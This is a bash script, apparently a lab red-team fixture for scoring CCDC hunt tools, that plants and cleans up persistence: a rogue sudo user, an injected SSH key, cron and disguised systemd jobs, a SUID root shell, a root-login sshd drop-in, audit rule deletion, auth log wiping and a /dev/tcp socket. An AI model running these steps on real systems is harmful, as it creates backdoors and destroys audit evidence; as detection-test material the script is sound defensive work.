#!/usr/bin/env bash
# Red-team simulation for the LAB ONLY. Plants a spread of realistic persistence
# and access footholds so hunt.sh and recon.sh can be scored against ground
# truth. Every technique here is a standard CCDC red-team move; nothing is novel
# or weaponized. Run only on a disposable VM you own.
#
#   sudo ./plant.sh          plant everything, print the ground-truth list
#   sudo ./plant.sh --clean  remove everything it planted
set -u
MARK="RT_LAB_PLANT"   # every artifact is tagged so cleanup is exact
manifest=/root/.rt_manifest
sudoers_file=/etc/sudoers.d/rt-lab
service_home=/var/lib/rtsvc
web_probe=/var/www/html/.rt-health.jsp
plant_failures=0

plant() { printf '  planted: %s\n' "$1"; printf '%s\n' "$1" >>"$manifest"; }
plant_failed() { printf '  FAILED:  %s\n' "$1" >&2; plant_failures=$((plant_failures+1)); }

if [ "${1:-}" = "--clean" ]; then
  echo "[*] removing lab plants"
  systemctl disable --now rt-backdoor.timer >/dev/null 2>&1 || true
  rm -f /etc/systemd/system/rt-backdoor.service /etc/systemd/system/rt-backdoor.timer
  systemctl daemon-reload
  crontab -l 2>/dev/null | grep -v "$MARK" | crontab - 2>/dev/null || true
  rm -f /etc/cron.d/rt-cron /etc/profile.d/rt-profile.sh "$sudoers_file" "$web_probe"
  sed -i "/$MARK/d" /root/.bashrc 2>/dev/null || true
  userdel -r rtsvc 2>/dev/null || true
  rm -f /usr/local/bin/rt-implant /tmp/.rt-listener /dev/shm/.rt
  # restore an SUID bash if we made one
  rm -f /usr/local/bin/rootbash
  # The live attacks: kill the processes by the payload path they were started
  # with, never by name. `pkill python3` on a box where a scored service is a
  # Python app is an outage you caused during cleanup.
  for payload in /usr/local/lib/.rt-c2.py /usr/local/lib/.rt-udp.py; do
    for proc in /proc/[0-9]*/cmdline; do
      [ -r "$proc" ] || continue
      tr '\0' '\n' <"$proc" 2>/dev/null | grep -Fxq -- "$payload" || continue
      pid=${proc#/proc/}; pid=${pid%/cmdline}
      kill -9 "$pid" 2>/dev/null || true
    done
    rm -f "$payload"
  done
  # The held-open outbound socket: matched on the exact command line the plant
  # used, so an unrelated shell on the box is never a candidate.
  for proc in /proc/[0-9]*/cmdline; do
    [ -r "$proc" ] || continue
    tr '\0' '\n' <"$proc" 2>/dev/null | grep -q 'exec 3<>/dev/tcp/' || continue
    tr '\0' '\n' <"$proc" 2>/dev/null | grep -q 'while :; do sleep 3600' || continue
    pid=${proc#/proc/}; pid=${pid%/cmdline}
    kill -9 "$pid" 2>/dev/null || true
  done
  rm -f /etc/ssh/sshd_config.d/99-rt-tuning.conf
  # remove the extra authorized_key
  [ -f /root/.ssh/authorized_keys ] && sed -i "/$MARK/d" /root/.ssh/authorized_keys
  rm -f "$manifest"
  echo "[*] done"
  exit 0
fi

[ "$(id -u)" -eq 0 ] || { echo "run as root on a lab VM"; exit 1; }
: >"$manifest"
echo "[*] planting lab persistence (all tagged $MARK)"

# 1. Rogue local user with a password and a real shell.
if id rtsvc >/dev/null 2>&1; then
  plant_failed "user:rtsvc already exists; refusing to modify an unowned lab account"
elif useradd -m -d "$service_home" -s /bin/bash rtsvc 2>/dev/null \
  && printf '%s\n' 'rtsvc:Sup3rSecret!' | chpasswd \
  && id rtsvc >/dev/null 2>&1; then
  plant "user:rtsvc|home=$service_home|uid=$(id -u rtsvc)"
else
  passwd -l rtsvc >/dev/null 2>&1 || true
  plant_failed "user:rtsvc"
fi

# 2. Sudoers drop-in - passwordless root for the rogue user.
sudoers_staged="${sudoers_file}.new.$$"
if printf '%s\n' "rtsvc ALL=(ALL) NOPASSWD:ALL # $MARK" >"$sudoers_staged" \
  && chmod 0440 "$sudoers_staged" \
  && visudo -cf "$sudoers_staged" >/dev/null 2>&1 \
  && mv -f "$sudoers_staged" "$sudoers_file" \
  && visudo -c >/dev/null 2>&1; then
  plant "sudoers:$sudoers_file|rtsvc NOPASSWD:ALL"
else
  rm -f "$sudoers_staged"
  plant_failed "sudoers:$sudoers_file"
fi

# 3. Extra key in a service-account home outside /home. This is where a sweep
# hard-coded to /root and /home/* used to miss it.
if mkdir -p "$service_home/.ssh" \
  && chmod 0700 "$service_home/.ssh" \
  && printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILABPLANTdummykeyforhuntdetection $MARK" >>"$service_home/.ssh/authorized_keys" \
  && chmod 0600 "$service_home/.ssh/authorized_keys"; then
  chown -R rtsvc:rtsvc "$service_home/.ssh" 2>/dev/null || true
  plant "ssh-key:$service_home/.ssh/authorized_keys|signature=LABPLANT"
else
  plant_failed "ssh-key:$service_home/.ssh/authorized_keys"
fi

# 4. The harmless implant stand-in is installed before schedulers reference it.
implant_staged=/usr/local/bin/rt-implant.new.$$
if { printf '%s\n' '#!/bin/sh' "# $MARK harmless beacon stand-in" ':' >"$implant_staged"; } \
  && chmod 0755 "$implant_staged" \
  && mv -f "$implant_staged" /usr/local/bin/rt-implant \
  && grep -q "$MARK" /usr/local/bin/rt-implant; then
  plant "binary:/usr/local/bin/rt-implant|signature=$MARK"
else
  rm -f "$implant_staged"
  plant_failed "binary:/usr/local/bin/rt-implant"
fi

# 5. Cron persistence (system cron.d).
cron_staged=/etc/cron.d/rt-cron.new.$$
if printf '%s\n' "*/5 * * * * root /usr/local/bin/rt-implant # $MARK" >"$cron_staged" \
  && chmod 0644 "$cron_staged" \
  && mv -f "$cron_staged" /etc/cron.d/rt-cron \
  && grep -q "$MARK" /etc/cron.d/rt-cron; then
  plant "cron-file:/etc/cron.d/rt-cron|signature=$MARK"
else
  rm -f "$cron_staged"
  plant_failed "cron-file:/etc/cron.d/rt-cron"
fi

# 6. Root crontab entry.
if { crontab -l 2>/dev/null; printf '%s\n' "*/10 * * * * /usr/local/bin/rt-implant # $MARK"; } | crontab - \
  && crontab -l 2>/dev/null | grep -q "$MARK"; then
  plant "root-crontab:root|signature=$MARK"
else
  plant_failed "root-crontab:root"
fi

# 7. systemd service + timer (the modern persistence).
unit_stage=$(mktemp -d /tmp/ccdc-plant-units.XXXXXX) \
  || { plant_failed "create systemd staging directory"; unit_stage=''; }
if [ -n "$unit_stage" ]; then
  service_staged="$unit_stage/rt-backdoor.service"
  timer_staged="$unit_stage/rt-backdoor.timer"
  cat >"$service_staged" <<UNIT
[Unit]
Description=System Logging Helper
[Service]
ExecStart=/usr/local/bin/rt-implant
UNIT
  cat >"$timer_staged" <<UNIT
[Unit]
Description=System Logging Helper Timer
[Timer]
OnBootSec=60
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
UNIT
  if systemd-analyze verify "$service_staged" "$timer_staged" >/dev/null 2>&1 \
    && mv -f "$service_staged" /etc/systemd/system/rt-backdoor.service \
    && mv -f "$timer_staged" /etc/systemd/system/rt-backdoor.timer \
    && systemctl daemon-reload \
    && systemctl enable --now rt-backdoor.timer >/dev/null 2>&1 \
    && systemctl is-active --quiet rt-backdoor.timer; then
    rmdir "$unit_stage" 2>/dev/null || true
    plant "systemd-timer:rt-backdoor.timer|description=System Logging Helper"
  else
    rm -f "$service_staged" "$timer_staged"
    rmdir "$unit_stage" 2>/dev/null || true
    plant_failed "systemd-timer:rt-backdoor.timer"
  fi
fi

# 8. Keyword-light profile and bashrc hooks. The marker gives the lab an exact
# cleanup key, but the executable lines themselves contain no suspicious word.
if printf '%s\n' ". /usr/local/lib/.session-env 2>/dev/null || : # $MARK" >/etc/profile.d/rt-profile.sh \
  && chmod 0644 /etc/profile.d/rt-profile.sh; then
  plant "profile:/etc/profile.d/rt-profile.sh|signature=$MARK"
else
  plant_failed "profile:/etc/profile.d/rt-profile.sh"
fi
if sed -i "1i. /usr/local/lib/.session-env 2>/dev/null || : # $MARK lab bashrc hook" /root/.bashrc \
  && head -n 1 /root/.bashrc | grep -q "$MARK"; then
  plant "bashrc:/root/.bashrc|position=first-line|signature=$MARK"
else
  plant_failed "bashrc:/root/.bashrc"
fi

# 9. SUID root shell - privilege-escalation foothold.
if cp /bin/bash /usr/local/bin/rootbash \
  && chmod 4755 /usr/local/bin/rootbash \
  && [ -u /usr/local/bin/rootbash ]; then
  plant "suid:/usr/local/bin/rootbash|mode=4755"
else
  plant_failed "suid:/usr/local/bin/rootbash"
fi

# 10. Payload in /dev/shm (fileless-ish location; it need not execute on noexec).
if cp /usr/local/bin/rt-implant /dev/shm/.rt 2>/dev/null \
  && chmod 0755 /dev/shm/.rt \
  && grep -q "$MARK" /dev/shm/.rt; then
  plant "tmpfile:/dev/shm/.rt|signature=$MARK"
else
  plant_failed "tmpfile:/dev/shm/.rt"
fi

# 11. Non-PHP web foothold, harmless but outside the old extension filter.
if [ -d /var/www/html ]; then
  if printf '%s\n' "<%-- $MARK harmless JSP stand-in --%>" >"$web_probe" \
    && chmod 0644 "$web_probe"; then
    plant "web-file:$web_probe|signature=$MARK"
  else
    plant_failed "web-file:$web_probe"
  fi
else
  printf '  skipped: web-file test (/var/www/html absent)\n'
fi

# --- 12-16: the live attacks -------------------------------------------------
#
# Everything above this line is an artifact on disk, which is what hunt.sh and
# recon.sh were built to find. The five below are the ones that leave the disk
# looking normal, and they are here because the kit grew checks for exactly
# these and untested checks are decoration.
#
# A NOTE ON THE REVERSE SHELL, DELIBERATELY: the process below holds an
# outbound connection and does NOT read commands from it. That is the whole
# difference between a detection fixture and a backdoor. The detector's input -
# a bash process owning an established outbound socket on 443 - is identical
# either way, so nothing is lost by leaving out the loop that would execute
# whatever the far end sent, and what is gained is that this file never
# contains a working remote shell. Keep it that way.

rt_port_free() {
  ss -tlnH "sport = :$1" 2>/dev/null | grep -q . && return 1
  return 0
}

# 12. Outbound "C2" on 443: the payload that never touches the disk.
c2_port=${RT_C2_PORT:-443}
c2_addr=$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)
if [ -z "$c2_addr" ]; then
  printf '  skipped: outbound C2 test (no non-loopback address on this VM)\n'
elif ! rt_port_free "$c2_port"; then
  printf '  skipped: outbound C2 test (port %s is already in use - set RT_C2_PORT)\n' "$c2_port"
elif ! command -v python3 >/dev/null 2>&1; then
  printf '  skipped: outbound C2 test (python3 is needed to hold the far end)\n'
else
  cat >/usr/local/lib/.rt-c2.py <<'PY'
import socket, sys, time
# Lab fixture: accepts connections and does nothing with them. It exists so the
# defender's socket table has something real to find.
host, port = sys.argv[1], int(sys.argv[2])
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port)); s.listen(4); s.settimeout(5)
held = []
while True:
    try:
        c, _ = s.accept(); held.append(c)
    except Exception:
        time.sleep(1)
PY
  setsid python3 /usr/local/lib/.rt-c2.py "$c2_addr" "$c2_port" </dev/null >/dev/null 2>&1 &
  c2_pid=$!
  sleep 1
  # The "implant": holds the socket open, reads nothing, executes nothing.
  setsid bash -c "exec 3<>/dev/tcp/$c2_addr/$c2_port; while :; do sleep 3600; done" \
    </dev/null >/dev/null 2>&1 &
  shell_pid=$!
  sleep 1
  if ss -tnH state established "dst $c2_addr:$c2_port" 2>/dev/null | grep -q .; then
    plant "c2:bash-outbound|addr=$c2_addr:$c2_port|listener_pid=$c2_pid|shell_pid=$shell_pid"
  else
    kill -9 "$c2_pid" "$shell_pid" 2>/dev/null || true
    plant_failed "c2:bash-outbound|addr=$c2_addr:$c2_port"
  fi
fi

# 13. Drop the runtime audit rules the way a service restart does.
if command -v auditctl >/dev/null 2>&1; then
  rules_before=$(auditctl -l 2>/dev/null | grep -c . || true)
  [ -n "$rules_before" ] || rules_before=0
  if auditctl -D >/dev/null 2>&1; then
    plant "audit:runtime-rules-cleared|rules_before=$rules_before"
  else
    plant_failed "audit:runtime-rules-cleared"
  fi
else
  printf '  skipped: audit rule drop (no auditctl on this VM)\n'
fi

# 14. SSH drop-in that re-enables root, with sshd_config untouched.
#
# sshd is deliberately NOT reloaded. The file alone is what `sshd -T` reads, so
# the detection is exercised either way - and leaving the daemon unreloaded also
# exercises the "config changed after sshd started" check, which is the one that
# catches a booby trap set for the next restart.
if [ -d /etc/ssh/sshd_config.d ]; then
  if printf '# %s\nPermitRootLogin yes\nPasswordAuthentication yes\n' "$MARK" \
       >/etc/ssh/sshd_config.d/99-rt-tuning.conf; then
    plant "sshd-dropin:/etc/ssh/sshd_config.d/99-rt-tuning.conf|effect=PermitRootLogin-yes"
  else
    plant_failed "sshd-dropin:/etc/ssh/sshd_config.d/99-rt-tuning.conf"
  fi
else
  printf '  skipped: sshd drop-in (this box has no sshd_config.d)\n'
fi

# 15. A UDP listener owned by no systemd unit.
udp_port=${RT_UDP_PORT:-45455}
if command -v python3 >/dev/null 2>&1; then
  cat >/usr/local/lib/.rt-udp.py <<'PY'
import socket, sys, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", int(sys.argv[1])))
while True:
    time.sleep(3600)
PY
  setsid python3 /usr/local/lib/.rt-udp.py "$udp_port" </dev/null >/dev/null 2>&1 &
  udp_pid=$!
  sleep 1
  if ss -ulnH "sport = :$udp_port" 2>/dev/null | grep -q .; then
    plant "udp-listener:0.0.0.0:$udp_port|pid=$udp_pid|unit=none"
  else
    kill -9 "$udp_pid" 2>/dev/null || true
    plant_failed "udp-listener:0.0.0.0:$udp_port"
  fi
else
  printf '  skipped: UDP listener (python3 needed)\n'
fi

# 16. Wipe the auth log and stay on the box.
#
# This is destructive to a log on the lab VM, which is the point: the defender's
# job is to notice that it happened, and nothing notices a log that was never
# written to in the first place. A line is appended first so there is something
# to lose.
for auth_log in /var/log/auth.log /var/log/secure; do
  [ -f "$auth_log" ] || continue
  size_before=$(stat -c '%s' "$auth_log" 2>/dev/null || printf 0)
  logger -p auth.notice "$MARK pre-wipe marker" 2>/dev/null || true
  sleep 1
  if : >"$auth_log" 2>/dev/null; then
    plant "log-wipe:$auth_log|bytes_destroyed=$size_before"
  else
    plant_failed "log-wipe:$auth_log"
  fi
  break
done

echo
echo "[*] GROUND TRUTH - $(wc -l <"$manifest") artifacts planted:"
cat "$manifest"
[ "$plant_failures" -eq 0 ] || { echo "[*] $plant_failures plant(s) failed" >&2; exit 1; }
